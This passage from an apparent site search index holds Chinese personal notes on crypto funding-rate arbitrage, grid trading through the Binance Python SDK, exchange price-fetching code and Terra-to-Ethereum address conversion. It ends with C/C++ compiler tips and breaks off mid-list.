,"text":"<p>\u8fd9\u672c\u8d28\u4e0a\u662f\u4e00\u4e2a\u5957\u671f\u4fdd\u503c\u7684\u64cd\u4f5c\uff0c\u662f\u5957\u5229\uff0c\u4e0d\u662f\u9ad8\u9891\u4ea4\u6613\u7b56\u7565\uff0c\u5efa\u4ed3\u540e\u65e0\u9700\u64cd\u4f5c\uff0c\u53ea\u9700\u8981\u89c2\u5bdf\u662f\u5426\u8d8b\u52bf\u53cd\u8f6c\u51b3\u5b9a\u5e73\u4ed3\u65f6\u673a\uff0c\u4f8b\u5982\u5f53\u4e03\u65e5\u5e74\u5316\u6536\u76ca\u4e3a\u8d1f\u65f6\u5e73\u4ed3\u5356\u51fa</p> <p>\u671f\u8d27\u5408\u7ea6\u7684\u4ea4\u6613\u4ef7\u683c\u4e3a\u5565\u4f1a\u4e0e\u73b0\u8d27(BTC/USDT)\u76f8\u5dee\u4e0d\u5927\u5462\uff1f\u56e0\u4e3a\u5b58\u5728\u6bcf8\u4e2a\u5c0f\u65f6\u7684\u7ed3\u7b97\u673a\u5236\uff0c\u5982\u679c\u5408\u7ea6\u4ef7\u683c&gt;\u73b0\u8d27\u4ef7\u683c\uff0c\u8bf4\u660e\u591a\u65b9\u5360\u4f18\uff0c\u5219\u591a\u65b9\u5411\u7a7a\u65b9\u652f\u4ed8\u8d44\u91d1\u8d39\uff0c\u59820.01%\uff08\u5177\u4f53\u6570\u503c\u4e0e\u4ef7\u5dee\u76f8\u5173\uff09\u3002\u5b98\u65b9\u8bf4\u660e</p> <p>\u5957\u5229\u64cd\u4f5c\uff1a\u7528usdt\u4e70\u5165\u5e01\u79cd\uff0c\u7acb\u523b\u4e0b\u7a7a\u5355\u65e0\u6760\u6746\u505a\u7a7a\u76f8\u540c\u6570\u91cf\u2014\u2014\u8fd9\u6837\u6211\u4eec\u4e00\u4e70\u4e00\u5356\u76f8\u5f53\u4e8e\u6ca1\u6709\u4e70\u5165\uff0c\u8d44\u4ea7\u51c0\u503c\u4e0d\u53d7\u5e01\u4ef7\u6ce2\u52a8\u5f71\u54cd\uff0c\u53ea\u662f\u505a\u7a7a\u6536\u53d6\u8d44\u91d1\u8d39</p> <p>\u5177\u4f53\u64cd\u4f5c\uff1a\u5148\u5728\u6cd5\u5e01\u4ea4\u6613\u7528\u4eba\u6c11\u5e01\u4e70usdt\uff0c\u7136\u540e\u5728\u5e01\u5e01\u4ea4\u6613\u4e70\u516510.1usdt\u7684\u5e01\uff08\u591a\u4e70\u4e00\u70b9\u7ed9\u6263\u624b\u7eed\u8d39\uff09\uff0c\u7acb\u523b\u8f6c\u5165\u6c38\u7eed\u5408\u7ea6\u8d26\u6237\u5f00\u59cb1\u500d\u505a\u7a7a\u4e00\u5f20\uff0c\u7136\u540e\u957f\u671f\u6301\u6709\u76f4\u5230\u8d8b\u52bf\u53cd\u8f6c\uff08\u6301\u7eed\u652f\u4ed8\u8d44\u91d1\u8d39\uff09\u3002</p> <p>\u4e0d\u8981\u770b\u8d26\u6237\u7684\u6536\u76ca\u7387\uff0c\u8fd9\u4e2a\u5355\u5355\u662f\u505a\u7a7a\u672c\u8eab\u76f8\u5f53\u4e8e\u6301\u5e01\u7684\u6536\u76ca\u7387\uff0c\u6211\u4eec\u5e76\u6ca1\u6709\u6301\u5e01\uff0c\u6b63\u786e\u7684\u6536\u76ca\u8ba1\u7b97\u5e94\u8be5\u662f\u8d26\u6237\u6743\u76ca\uff08\u5e01\u7684\u6570\u91cf\uff09*\u5f53\u524d\u5e01\u5e01\u4ea4\u6613\u4ef7\u683c\uff0c\u6536\u76ca\u7684\u57fa\u51c6\u6bd4\u8f83\u5e94\u8be5\u662f\u4f4e\u98ce\u9669\u503a\u5238\u800c\u4e0d\u662f\u9ad8\u98ce\u9669\u6301\u5e01</p> <p>\u5386\u53f2\u6570\u636e\u67e5\u8be2\uff1a \u8d44\u91d1\u8d39\u7387 \u7ed3\u7b97\u4ef7\u683c</p> <p>\u722c\u53d6\u4e00\u4e0b\u5386\u53f2\u6570\u636e\uff1a\uff08\u770b\u8d77\u6765ONT\u5957\u5229\u6536\u76ca\u6700\u9ad8\uff0c\u4e0d\u8fc7\u4e0a\u7ebf\u65f6\u95f4\u4e0d\u591f\u957f\u4e0d\u5177\u6709\u4ee3\u8868\u6027\uff09</p> <p>\u8ba1\u7b97\u6536\u76ca\u7387\u65f6\u4e0d\u80fd\u7b80\u5355\u5bf9\u5355\u6b21\u6536\u76ca\u7387\u6c42\u548c\uff0c\u5e94\u8be5\u8003\u8651\u5e01\u4ef7\u6ce2\u52a8\u5bf9\u6700\u540e\u5b9e\u9645\u6536\u76ca\u7684\u5f71\u54cd\uff1a\u5047\u8bbe\u6295\u51651USD\uff0c\u8ba1\u7b97\u6bcf\u6b21\u7ed3\u7b97\u80fd\u6536\u5230\u591a\u5c11\u5e01\uff0c\u7d2f\u52a0\u540e\u6309\u6700\u8fd1\u4e00\u6b21\u7ed3\u7b97\u4ef7\u8ba1\u7b97\u8fd9\u4e9b\u5e01\u503c\u591a\u5c11USD\uff0c\u9664\u4ee5\u7ed3\u7b97\u6b21\u6570\u4e58\u4ee5\u4e00\u5e74\u7684\u7ed3\u7b97\u6b21\u6570\u5373\u4e3a\u5e74\u5316\u6536\u76ca</p> <pre><code>import requests, os, sys, time\nfrom decimal import Decimal\nfrom functools import lru_cache\n\nsess = requests.session()\n\n@lru_cache()\ndef getdata(coin, page=1):\n    page = str(page)\n    data = [Decimal(i['final_funding_rate']) for i in sess.get(\"https://futures.huobi.com/swap-order/x/v1/swap_funding_rate_page?contract_code=\"+coin+\"-USD&amp;page_index=\"+page+\"&amp;page_size=100\", headers={\"source\":\"web\"}).json()[\"data\"][\"settle_logs\"]]\n    settle = [Decimal(i[\"instrument_info\"][0][\"settle_price\"]) for i in sess.get(\"https://futures.huobi.com/swap-order/x/v1/swap_delivery_detail?symbol=\"+coin+\"&amp;page_index=\"+page+\"&amp;page_size=100\", headers={\"source\":\"web\"}).json()[\"data\"][\"delivery\"]]\n    return data, settle\n\ndef calc_fullprofit(coin):\n    data, settle = [], []\n    page = 1\n    x = getdata(coin)\n    while len(x[0]):\n        data.extend(x[0])\n        settle.extend(x[1])\n        page+=1\n        x = getdata(coin, page)\n    profit_coin = sum([k/settle[i] for i,k in enumerate(data)])\n    profit_usd = profit_coin*settle[0]\n    return \"%.2f\"%(profit_usd/len(data)*3*365*100) + \"%\", len(data)\n\ndata=[]\nfor i in \"BTC ETH EOS LINK BCH BSV LTC XRP ETC TRX ADA ATOM IOTA NEO ONT XLM XMR DASH ZEC\".split(\" \"):\n    profit, length = calc_fullprofit(i)\n    data.append([i, profit, length])\ndata.sort(key=lambda i:i[1], reverse=True)\nfor i,profit,length in data:\n    print(\"\",i, profit, length,\"\", sep=\"|\")\n</code></pre> <p>\u98ce\u9669\uff1a From \u6570\u5b57\u5e01\u5957\u5229\u7b80\u53f2\uff08\u4e0b\uff09</p> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8d44\u91d1\u8d39\u7387\u7684\u5957\u5229\u66f4\u52a0\u9002\u5408\u8d8b\u52bf\u4e0a\u6da8\u7684\u884c\u60c5\uff0c\u800c\u4e14\u8981\u7559\u610f\u884c\u60c5\u7684\u53cd\u8f6c\u5bfc\u81f4\u8d39\u7387\u8d8b\u52bf\u7684\u626d\u8f6c\uff0c\u53ef\u80fd\u4f1a\u5957\u5229\u5931\u6548\uff1b\u8fd8\u6709\u5c31\u662f\u5bf9\u4e8e\u50cf18\u5e74\u7684\u8d8b\u52bf\u4e0b\u8dcc\u884c\u60c5\uff0c\u867d\u7136\u5957\u5229\u903b\u8f91\u4e00\u6837\uff0c\u4f46\u64cd\u4f5c\u4f1a\u66f4\u52a0\u590d\u6742\uff0c\u56e0\u4e3a\u8fd9\u91cc\u9762\u8981\u6d89\u53ca\u5230\u6c38\u7eed\u5408\u7ea6+\u4ea4\u5272\u5408\u7ea6\u7684\u7ec4\u5408\u5bf9\u51b2\uff0c\u5360\u7528\u5e01\u6570\u4e5f\u4f1a\u7ffb\u500d\uff0c\u4e5f\u5c31\u662f\u8bf4\u540c\u6837\u7684\u5e01\u91cf\u5957\u5229\u5e74\u5316\u6536\u76ca\u7387\u8981\u62535\u6298\uff1b\u6240\u4ee5\uff0c\u597d\u597d\u73cd\u60dc\u8fd9\u6765\u4e4b\u4e0d\u6613\u7684\u597d\u884c\u60c5\u5427\u3002</p> <p>\u4ea4\u6613\u671f\u95f4\u624b\u901f\u6162\u6216\u4ea4\u6613\u4e0d\u6d3b\u8dc3\u4f1a\u5bfc\u81f4\u4e70\u5165\u73b0\u8d27\u4ef7\u683c\u9ad8\u4e8e\u505a\u7a7a\u4ef7\u683c\uff0c\u5bfc\u81f4\u989d\u5916\u7684\u6210\u672c\u635f\u8017\uff1b\u6301\u6709\u671f\u95f4\u7684\u6700\u5927\u98ce\u9669\u5728\u4e8e\u7f8e\u5143\u8d2c\u503c\u7684\u98ce\u9669\uff0c\u4f8b\u5982USDT 7.1\u4e70\u5165\uff0c\u6700\u540e6.9\u5356\u51fa\uff0c\u5373\u4e3a28.2\u2030\u4e8f\u635f</p> <p>\u53e6\u5916\uff0c\u5982\u679cbtc\u6301\u7eed\u4e0a\u6da8\uff0c\u5728\u6301\u4ed3\u4e2d\u770b\u5230\u505a\u7a7a\u4e8f\u4e86\u767e\u5206\u4e4b\u591a\u5c11\u8fd8\u662f\u6709\u70b9\u5fc3\u75db\u7684\uff0c\u8fd9\u5c31\u9700\u8981\u826f\u597d\u7684\u5fc3\u7406\u7d20\u8d28\uff0c\u5957\u5229\u76f8\u6bd4\u4e8e\u6301\u5e01\u52a8\u8f84\u4e00\u592910%\u7684\u6ce2\u52a8\u5c31\u6323\u4e0d\u5230\u591a\u5c11\u94b1hhh</p>"},{"location":"Bitcoin/#_4","title":"\u5957\u5229+\u7f51\u683c\u4ea4\u6613","text":"<p>\u4e0a\u8ff0\u80fd\u88ab\u9009\u51fa\u7684\u8d44\u91d1\u8d39\u7387\u9ad8\u7684\u5957\u5229\u5e01\u79cd\uff0c\u5f80\u5f80\u4e5f\u662f\u6da8\u5e45\u5de8\u5927\u7684\u5e01\u79cd\uff0c\u53ef\u80fd\u8fd8\u4e0d\u5982\u7b80\u5355\u6301\u5e01\u8d5a\u5f97\u66f4\u591a\uff0c\u4e8e\u662f\u53ef\u4ee5\u5c1d\u8bd5\u66f4\u7a33\u59a5\u7f51\u683c\u3002\u7f51\u683c\u7684\u4e00\u4e2a\u7f3a\u70b9\u5728\u4e8e\u8d44\u91d1\u5229\u7528\u7387\u4f4e\uff0c\u7b49\u7740\u6284\u5e95\u4e70\u5165\u7684\u8d44\u91d1\u662f\u95f2\u7f6e\u7684\uff0c\u81ea\u7136\u60f3\u5230\u53ef\u4ee5\u628a\u4e0a\u8ff0\u8d44\u91d1\u8d39\u7387\u5957\u5229\u7ed3\u5408\u8d77\u6765\uff0c\u8fd8\u6ca1\u4e70\u5165\u7684\u90e8\u5206\u5c31\u7b49\u91cf\u505a\u7a7a\uff0c\u4f18\u70b9\u5728\u4e8e\uff1a</p> <ul> <li>\u8fd8\u6ca1\u4e70\u5165\u7684\u6284\u5e95\u8d44\u91d1\u80fd\u8d5a\u53d6\u8d44\u91d1\u8d39\u7387\uff0c\u4e0d\u5b8c\u5168\u95f2\u7f6e</li> <li>\u6ca1\u6709usdt\u66b4\u96f7\u98ce\u9669\uff0c\u5e01\u672c\u4f4d\u6c38\u7eed\u5408\u7ea6\u6302\u94a9\u7684\u662f\u7f8e\u5143\u800c\u4e0d\u662fusdt</li> <li>\u624b\u7eed\u8d39\u4f4e\uff0c\u706b\u5e01\u73b0\u8d27\u4ea4\u6613\u53432\uff0c\u5e01\u5b89\u5408\u7ea6\u4ea4\u6613maker\u53ea\u6709\u4e071.5</li> </ul> <p>\u8c03\u7528\u5e01\u5b89python sdk\u81ea\u52a8\u6302\u5355\uff0c\u4ee3\u7801\u903b\u8f91\u662f\uff1a \u83b7\u53d6\u5f53\u524d\u6240\u6709\u7684\u6302\u5355\uff0c\u6bd4\u5bf9\u914d\u7f6e\u7684\u4ef7\u683c\u6570\u7ec4\uff0c\u627e\u5230\u7f3a\u5931\u7684\u4ef7\u683c\u4eec\u3002 \u8fd9\u4e9b\u7f3a\u5931\u7684\u4ef7\u683c\u662f\u56e0\u4e3a\u6302\u5355\u6210\u4ea4\u5bfc\u81f4\u7684\uff0c\u9700\u8981\u8865\u4e0a\u3002 \u6700\u65b0\u6210\u4ea4\u7684\u90a3\u4e00\u5355\u4ef7\u683c\u5b9a\u4e3ap\uff0cp\u672c\u8eab\u662f\u4e0d\u80fd\u8865\u5355\u7684\uff08\u521a\u7a81\u7834\u7684\u7f51\u683c\u672c\u8eab\u518d\u8865\u4e0a\u5c31\u662f\u767d\u4ea4\u624b\u7eed\u8d39\uff09\u3002 \u5c0f\u4e8ep\u7684\u7f3a\u5931\u4ef7\u683c\u9700\u8981\u8865\u4e0abuy\uff0c\u5927\u4e8e\u7684\u8865\u4e0asell\u3002</p> <p>\u5728\u884c\u60c5\u5267\u70c8\u6ce2\u52a8\u7684\u65f6\u5019\uff0c\u53ef\u80fd\u4e00\u5206\u949f\u5c31\u4f1a\u6210\u4ea4\u591a\u6b21\u8ba2\u5355\u9700\u8981\u53ca\u65f6\u8865\u5355\uff0c\u5c31\u9047\u5230\u4e86\u5177\u4f53\u7f16\u7801\u7684\u6311\u6218\uff1a</p>"},{"location":"Bitcoin/#_5","title":"\u5982\u4f55\u83b7\u53d6\u6700\u65b0\u7684\u6210\u4ea4\u8ba2\u5355\uff1f","text":"<p>\u8ba2\u5355\u53f7\u6392\u5e8f\uff1f\u4e0d\u884c\uff0corderId\u53ea\u662f\u6309\u4e0b\u5355\u65f6\u95f4\u9012\u589e\uff0corderId\u6700\u5927\u5e76\u4e0d\u4e00\u5b9a\u6700\u8fd1\u6210\u4ea4</p> <p>\u83b7\u53d6\u5f53\u524d\u6700\u65b0\u4ef7\u683c\uff0c\u6bd4\u8f83\u54ea\u4e2a\u7f3a\u5931\u4ef7\u683c\u79bb\u6700\u65b0\u4ef7\u683c\u66f4\u8fd1\uff1f\u5728\u884c\u60c5\u5267\u70c8\u6ce2\u52a8\u65f6\u4e0d\u53ef\u9760</p> <p>\u83b7\u53d6\u5386\u53f2\u6240\u6709\u8ba2\u5355\uff0c\u6309updateTime\u6392\u5e8f\uff1f\u5b9e\u6d4b\u53d1\u73b0\u8fd9\u4e2aapi\u6709\u4e24\u4e2a\u95ee\u9898\uff1a</p> <ul> <li>\u591a\u4e2a\u8ba2\u5355updateTime\u76f8\u540c\uff0c\u65e0\u6cd5\u6392\u5e8f\u533a\u5206</li> <li>\u6570\u636e\u5ef6\u8fdf\uff0c\u6700\u65b0\u6210\u4ea4\u7684\u8ba2\u5355\u5e76\u4e0d\u4e00\u5b9a\u51fa\u73b0</li> </ul> <p>\u89e3\u51b3\u65b9\u6848\u662f\uff1a</p> <ul> <li>\u83b7\u53d6\u6700\u65b0\u6210\u4ea4\u7684\u6210\u4ea4\u8bb0\u5f55\uff0c\u4ece\u4e2d\u63d0\u53d6\u5305\u542b\u7684orderId\uff0c\u518d\u67e5\u8be2\u8ba2\u5355\u3002\u4e0d\u6392\u9664\u8fd9\u4e2aREST API\u4e5f\u5b58\u5728\u6570\u636e\u5ef6\u8fdf\u7684\u95ee\u9898</li> <li>\u4f7f\u7528websocket</li> </ul>"},{"location":"Bitcoin/#python-sdk","title":"\u5e01\u5b89Python SDK\u6ca1\u6709\u5e01\u672c\u4f4d\u5408\u7ea6\u63a5\u53e3","text":"<p>\u73b0\u5728\u4ee3\u7801\u5df2\u7ecf\u6709\u66f4\u65b0\u8865\u4e0a\u4e86REST API\u7684\u7f3a\u5931\uff0c\u4f46websocket\u8ba2\u9605\u8d26\u6237\u53d8\u52a8\u7684\u4ee3\u7801\u8fd8\u662f\u5f97\u81ea\u5df1\u6765\uff1a</p> <p>client.py\u91ccstream_get_listen_key\u9644\u8fd1\u52a0\u4e0a\uff1a</p> <pre><code>    def futures_stream_get_listen_key(self):\n        res = self._request_futures_api(\"post\", \"listenKey\", True, data={})\nreturn res['listenKey']\n</code></pre> <p>\u8c03\u7528\u5c31\u8fd9\u6837\uff1a</p> <pre><code>    def start_websocket(self, handle_order):\n        def process_message(msg):\n            global conn_key\nif msg['e'] not in ['ACCOUNT_UPDATE'] and not (msg['e']=='ORDER_TRADE_UPDATE' and msg['o']['X']=='NEW'):\n                myprint(\"message:\", msg['e'], msg)\nif msg['e'] == 'error':\n                bm.stop_socket(conn_key)\nbm.close()\nreactor.stop()\nprint(\"socket stopped, exit now!\")\nexit()\nelif msg['e']=='ORDER_TRADE_UPDATE':\n                o = msg['o']\n                if o['X']!='FILLED':\n                    return\norder = {\"price\":o['p'], \"orderId\":o['i'], \"side\":o[\"S\"], \"symbol\":o[\"s\"], \"clientOrderId\":o[\"c\"]}\n                return handle_order(order)\n\nclient = self.client\nclient.stream_get_listen_key = client.futures_stream_get_listen_key\nclient.FUTURES_URL = client.FUTURES_URL.replace(\"fapi\", \"dapi\")\nbm = BinanceSocketManager(client)\nbm.STREAM_URL = \"wss://dstream.binance.com/\"\nconn_key = bm.start_user_socket(process_message)\nbm.start()\n</code></pre> <p>\u4e0a\u8ff0\u4ee3\u7801\u76f4\u63a5\u9b54\u6539BinanceSocketManager\u7684\u5e38\u6570\u5b9a\u4e49\u6765\u5b9e\u73b0\u5bf9\u5e01\u672c\u4f4d\u5408\u7ea6API\u7684\u8c03\u7528\uff0c\u8ba2\u9605\u8d26\u6237\u53d8\u52a8\u6d88\u606f\uff0c\u53ea\u5904\u7406ORDER_TRADE_UPDATE\u4e2dFILLED\u7684\u8ba2\u5355\uff0c\u8c03\u7528handle_order\u51fd\u6570\u8fdb\u884c\u5904\u7406</p>"},{"location":"Bitcoin/#_6","title":"\u5404\u79cd\u5f02\u5e38\u5904\u7406","text":"<p>\u907f\u514d\u91cd\u590d\u4e0b\u5355: \u4e0b\u5355\u65f6\u6307\u5b9a\u5305\u542b\u4ef7\u683c\u4fe1\u606f\u7684newClientOrderId\uff0c\u91cd\u590d\u4e0b\u5355\u81ea\u7136\u4f1a\u5931\u8d25\uff0c\u907f\u514d\u76f8\u540c\u7684\u8ba2\u5355\u91cd\u590d\u4e0b\u5355<code>APIError(code=-4015): Client order id is not valid.</code>\uff0c\u4f46\u8fd9\u4e2a\u4fdd\u62a4\u53ea\u9488\u5bf9\u8fd8\u5728\u6302\u5355\u7684\u8ba2\u5355\uff0c\u76f8\u540c\u7684clientorderid\u5982\u679c\u524d\u8ff0\u8ba2\u5355\u5df2\u7ecf\u6210\u4ea4\uff0c\u4e0d\u4f1a\u963b\u6b62\u65b0\u7684\u63d0\u4ea4\u3002</p> <p>\u5df2\u7ecf\u91cd\u590d\u4e0b\u5355\uff1a\u9700\u8981\u6bd4\u5bf9\u5f53\u524d\u4ef7\u683c\u4e0e\u5b9a\u4e49\u597d\u7684\u7f51\u683c\u6570\u7ec4\uff0c\u5224\u65ad\u5f53\u524d\u5e94\u8be5\u7684\u4ed3\u4f4d\u662f\u591a\u5c11\uff0c\u7136\u540e\u4f7f\u7528\u5e02\u4ef7\u5355\u6216\u8005\u989d\u5916\u5728\u76f8\u90bb\u7f51\u683c\u4e0b\u5355\u4fdd\u8bc1\u4ed3\u4f4d\u7684\u6b63\u786e\u6027\uff0c\u6ce8\u610f\u6781\u7aef\u884c\u60c5\u4e0b\u81ea\u52a8\u8865\u4ed3\u4f9d\u636e\u7684\u4ed3\u4f4d\u4ef7\u503c\u53ef\u80fd\u6709\u8bef\u3002\u4f8b\u5982\u4e70\u5165\u662f\u9760\u5e73\u4ed3\u505a\u7a7a\u5b9e\u73b0\u7684\uff0c\u8fd9\u662f\u79cdreduceOnly\u7684\u8ba2\u5355\uff0c\u5fc5\u987b\u6709\u8db3\u591f\u591a\u7684\u505a\u7a7a\u4ed3\u4f4d\u624d\u80fd\u4e70\uff0c\u5426\u5219\u62a5\u9519\uff1a<code>APIError(code=-2022): ReduceOnly Order is rejected.</code></p> <p>\u5df2\u7ecf\u4e0b\u7684\u8ba2\u5355\u72b6\u6001\u53d8\u6210\u201c\u5df2\u8fc7\u671f\u201d\uff1a\u8fd9\u79cd\u8fd8\u662f\u56e0\u4e3a\u5df2\u7ecf\u53d1\u751f\u4e86\u8d85\u4e70/\u8d85\u5356\uff0c\u4fdd\u8bc1\u91d1\u4e0d\u8db3\uff0c\u5b98\u65b9\u8bf4\u660e\uff1a</p> <p>https://www.binance.com/zh-CN/support/faq/360039707291</p> <p>\u4fdd\u8bc1\u91d1\u5ba1\u6838\u4e0d\u8fc7\uff08\u9488\u5bf9\u4e8e\u6b62\u76c8\u6b62\u635f\u5355\uff09\uff1a\u6b62\u76c8\u6b62\u635f\u5355\u4e2d\u9700\u8981\u8bbe\u7f6e\u89e6\u53d1\u4ef7\u548c\u6210\u4ea4\u4ef7\uff08\u5e02\u4ef7\u6b62\u76c8\u6b62\u635f\u5355\u4e2d\uff0c\u53ef\u4ee5\u6839\u636e\u4e0d\u540c\u9700\u8981\u8bbe\u7f6e\u6839\u636e\u6807\u8bb0\u4ef7\u683c\u6216\u6700\u65b0\u4ef7\u683c\u89e6\u53d1\uff09\uff0c\u7cfb\u7edf\u4f1a\u8fdb\u884c\u4e24\u6b21\u4fdd\u8bc1\u91d1\u5ba1\u6838\uff0c\u5206\u522b\u5728\u4e0b\u5355\u524d\u548c\u6210\u4ea4\u524d\u3002\u8ba2\u5355\u89e6\u53d1\u4e4b\u540e\uff0c\u7cfb\u7edf\u4f1a\u7acb\u5373\u8fdb\u884c\u7b2c\u4e8c\u6b21\u4fdd\u8bc1\u91d1\u5ba1\u6838\uff0c\u82e5\u5f53\u524d\u53d1\u751f\u4e86\u4e8f\u635f\u6216\u5212\u8f6c\u51fa\u4e86\u4fdd\u8bc1\u91d1\uff0c\u5bfc\u81f4\u53ef\u7528\u4fdd\u8bc1\u91d1\u4e0d\u8db3\uff0c\u6b64\u65f6\u8ba2\u5355\u72b6\u6001\u4f1a\u663e\u793a\u5df2\u8fc7\u671f\u3002</p> <p>\u4fdd\u8bc1\u91d1\u4e0d\u8db3\uff1a\u76f4\u63a5\u628a\u6760\u6746\u500d\u6570\u53d8\u62102\u53ef\u4ee5\u907f\u514d\u8fd9\u4e2a\u95ee\u9898\uff0c\u5373\u4f7f\u52a0\u6760\u6746\u4e5f\u4e0d\u4f1a\u51fa\u73b0\u5f3a\u5e73\u4ef7\u683c\u3002</p> <p>\u670d\u52a1\u5668\u7f51\u7edc\u4e0d\u53ef\u9760\uff1a\u5728\u5176\u4ed6\u5730\u533a\u7684\u670d\u52a1\u5668\u540c\u65f6\u8dd1\u8f6e\u8be2\uff0c\u5373\u4f7f\u5355\u4e2a\u670d\u52a1\u5668\u6302\u6389\uff0c\u4e5f\u6709\u5176\u4ed6\u670d\u52a1\u5668\u9760\u8f6e\u8be2\u8865\u4e0a\u8ba2\u5355\uff0c\u4f46\u6ce8\u610f\u5206\u5e03\u5f0f\u540e\u65e5\u5fd7\u6536\u96c6\u662f\u4e2a\u65b0\u7684\u96be\u70b9</p> <p>listenKeyExpired\uff1a\u6536\u5230\u8fd9\u79cd\u7c7b\u578b\u7684\u6d88\u606f\u9700\u8981\u91cd\u65b0\u8fde\u63a5\uff0c\u4e5f\u53ef\u4ee5\u4e3b\u52a8\u8f6e\u8be2\u7684\u65f6\u5019\u8c03\u7528futures_stream_get_listen_key\u5bf9\u73b0\u6709\u7684Listen Key\u8fdb\u884c\u5237\u65b0</p>"},{"location":"Bitcoin/#_7","title":"\u83b7\u53d6\u4ea4\u6613\u6240\u4ef7\u683c\u4fe1\u606f","text":"<p>\u5728\u7edf\u8ba1\u8d44\u4ea7\u65f6\u5bf9\u4ef7\u683c\u5b9e\u65f6\u6027\u6ca1\u6709\u8981\u6c42\uff0c\u53ef\u4ee5\u7f13\u5b5860\u79d2\uff1b\u7528\u6cd5\uff1a<code>print(HUOBI_Price.btc)</code>\uff0c\u8fd4\u56de\u7684\u662f\u5b57\u7b26\u4e32\u7c7b\u578b</p> <pre><code>class class_CEXPRICE():\n    def __init__(self):\n        self.updatetime = -1\n    def __getattr__(self, token):\n        if time.time()-self.updatetime&gt;=60:\n            print(\"fetch\", self, end=\"\", flush=True)\n            self.data = self.fetchprice()\n            print()\n            self.updatetime = time.time()\n        return self.handleprice(token)\n\nclass class_HUOBI_Price(class_CEXPRICE):\n    def fetchprice(self):\n        return sess.get(\"https://api.huobi.pro/market/tickers\", timeout=5).json()[\"data\"]\n    def handleprice(self, token):\n        return [i for i in self.data if i[\"symbol\"]==token.lower()+\"usdt\"][0][\"close\"]\nHUOBI_Price=class_HUOBI_Price()\n\nclass class_BINANCE_Price(class_CEXPRICE):\n    def fetchprice(self):\n        return sess.get(\"https://api.binance.com/api/v3/ticker/price\", timeout=5).json()\n    def handleprice(self, token):\n        if \"busd\" not in token.lower():\n            token = token.lower()+\"usdt\"\n        return [i for i in self.data if i[\"symbol\"]==token.upper()][0][\"price\"]\nBINANCE_Price=class_BINANCE_Price()\n\nclass class_MXC_Price(class_CEXPRICE):\n    def fetchprice(self):\n        return sess.get(\"https://www.mxc.com/open/api/v2/market/ticker\", timeout=5).json()[\"data\"]\n    def handleprice(self, token):\n        return [i for i in self.data if i[\"symbol\"]==token.upper()+\"_USDT\"][0][\"last\"]\nMXC_Price = class_MXC_Price()\n</code></pre>"},{"location":"Bitcoin/#terra","title":"terra\u5730\u5740\u8f6c\u4e3a\u4ee5\u592a\u574a\u5730\u5740","text":"<p>\u4f9d\u8d56\u5e93\uff1a<code>pip3 install bech32</code></p> <pre><code>import bech32\nwords = bech32.bech32_decode(terra_addr)[1]\nethaddr = \"\".join([hex(i)[2:].rjust(2,\"0\") for i in bech32.convertbits(words,5,8,False)])\n</code></pre> <p>\u53cd\u8fc7\u6765\u5c31\u662f</p> <pre><code>words = [int(ethaddr[i:i+2], 16) for i in range(0,40,2)]\nterra_addr = bech32.bech32_encode(\"terra\", bech32.convertbits(words, 8, 5, False))\n</code></pre>"},{"location":"C/","title":"C\u8bed\u8a00","text":"<p>\u4e00\u70b9\u5173\u4e8eC\u7684\u5efa\u8bae\u54af\uff0c\u4e5f\u5305\u542bC++</p> <p>\u987a\u5e26\u9644\u4e0a\u51e0\u4e2a\u9898\u76ee\u548c\u6211\u5199\u7684\u89e3\u7b54</p>"},{"location":"C/#dev-c","title":"\u5173\u4e8eDev C++","text":"<ul> <li> <p>\u6709\u65f6\u5019\u4f1a\u53d1\u751f\u6539\u4e86\u4ee3\u7801\u4f46\u8fd0\u884c\u8d77\u6765\u662f\u65e7\u7248\u672c\u7684\u60c5\u51b5\uff0c\u9700\u8981\u68c0\u67e5\u662f\u5426\u5173\u95ed\u4e86\u6b63\u5728\u8fd0\u884c\u7684exe\uff0c\u5982\u679c\u662f\u5de5\u7a0b\u9700\u8981\u6309F12\u5168\u90e8\u91cd\u65b0\u7f16\u8bd1\u6e05\u7a7a\u7f13\u5b58</p> </li> <li> <p>\u7f16\u8bd1\u5de5\u7a0b\u9519\u8bef\u5b9a\u4f4d\u5728Makefile\u8bf4\u660e\u6709\u51fd\u6570\u58f0\u660e\u4e86\u4f46\u6ca1\u6709\u5b9a\u4e49\uff0c\u6216\u8005\u53ef\u80fd\u662f\u51fa\u73b0\u4e86\u591a\u4e2a\u6587\u4ef6\u540c\u540d\u51fd\u6570\uff0c\u5c0f\u5fc3\u5176\u521b\u5efa\u5de5\u7a0b\u7684\u65f6\u5019\u81ea\u52a8\u4ea7\u751f\u7684main.c</p> </li> <li> <p>\u5982\u679c\u5355\u7eaf\u53ea\u9700\u8981\u7f16\u8bd1\u4e00\u4e2aC\u6587\u4ef6\uff0c\u4e3a\u8ffd\u6c42\u7f16\u8bd1\u901f\u5ea6\u53ef\u4ee5\u8003\u8651\u4f7f\u7528tcc (Tiny C Compile)\u7f16\u8bd1\u5668\uff0c\u53c2\u89c1https://qs1401.com/?post=18\uff1b\u53e6\u5916\u4f60\u53ef\u4ee5\u4fee\u6539\u7f16\u8bd1\u7684\u4f18\u5316\u53c2\u6570\uff0c\u4e0d\u8981\u7528<code>-O3</code>\u8fd9\u79cd\u66f4\u9002\u5408\u6b63\u5f0f\u53d1\u5e03\u65f6\u7684\u4f18\u5316\u9009\u9879</p> </li> <li> <p>\u4e0d\u8981\u5728\u4e00\u4e2a\u9879\u76ee\u4e2d\u6df7\u7528.c\u548c.cpp\uff0c\u5c06\u5bfc\u81f4<code>ld</code>\u94fe\u63a5\u7684\u65f6\u5019\u51fd\u6570\u627e\u4e0d\u5230\u3002\u56e0\u4e3a\u7f16\u8bd1.cpp\u7684\u65f6\u5019\u662fC++\u7684\u7f16\u8bd1\uff0c\u7531\u4e8e\u8981\u652f\u6301\u91cd\u8f7d\uff0c\u7f16\u8bd1\u5668\u4f1a\u81ea\u52a8\u4fee\u6539\u51fd\u6570\u540d\u79f0\uff0c\u5bfc\u81f4\u4ee3\u7801\u4e2d\u540c\u6837\u540d\u5b57\u7684\u51fd\u6570\u7f16\u8bd1\u51fa\u6765\u7684.o\u6587\u4ef6\u91cc\u9762\u51fd\u6570\u540d\u79f0\u662f\u4e0d\u540c\u7684\uff0c\u8fd9\u6837.c\u627e\u4e0d\u5230.cpp\u7684\u51fd\u6570\uff0c\u81ea\u7136\u65e0\u6cd5\u94fe\u63a5\uff1b\u4e0d\u8fc7\u8fd8\u662f\u6709\u6280\u5de7\u7684\uff1aextern \u201cC\u201d\u5305\u4f4f\u5373\u53ef</p> </li> <li> 